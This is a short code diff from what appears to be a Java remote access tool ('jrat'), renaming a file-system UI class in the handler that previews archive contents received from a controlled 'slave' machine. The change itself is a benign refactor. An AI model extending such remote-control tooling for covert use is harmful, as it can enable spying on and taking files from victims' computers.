@@ -2,7 +2,7 @@ package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPacket;
-import jrat.module.fs.ui.FrameRemoteFiles;
+import jrat.module.fs.ui.PanelFileSystem;
 import jrat.module.fs.ui.previews.PanelPreviewArchive;
 
 import java.util.zip.ZipEntry;
@@ -16,7 +16,7 @@ public class Packet45ArchivePreview implements IncomingPacket {
 		String name = slave.readLine();
 		long size = slave.readLong();
 
-        FrameRemoteFiles panel = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
+        PanelFileSystem panel = (PanelFileSystem) slave.getPanel(PanelFileSystem.class);
 
 		if (panel != null) {
 
